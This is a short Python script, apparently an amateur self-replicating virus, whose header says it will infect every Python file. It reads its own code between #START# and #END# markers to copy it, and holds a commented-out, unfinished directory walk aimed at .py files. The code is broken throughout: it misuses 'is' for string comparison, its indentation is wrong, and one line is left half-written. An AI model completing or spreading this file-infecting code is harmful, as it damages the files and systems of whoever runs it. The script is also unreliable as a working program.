#it will infect all files that are python, only run this inside its own folder

#START#

import os
import sys

dir = os.getcwd()
print("working  directory" + dir)

print("are you sure you want to run this?")
runPayload = input("type Yes or No: ")
try:
    if runPayload is "yes":
    #read code from current program

        File = open(__file__, "r")  
        Virus = ""
        readVirus = False
    for line in File:
        if line == "#START#\n":
            readVirus = True
            Virus += line
        elif line == "#END#\n":
            readVirus = False
            Virus += line
            break
        elif readVirus == True:
            Virus += line
    File.close()    
    print(Virus)

except:
    print(f"you entered '{runPayload}' cancelling confirmed")
    print("Exited")
    print("(Aborted with a non zero value [1])")
    sys.exit(1)
   


#payload

#for forlder in os.walk(os.getcwd()):
#    for file in folder[2]:
#        if os.path.splitext(file) [1] == ".py":
#            path os.path.join

#comments in caps are flags to make it run

#END#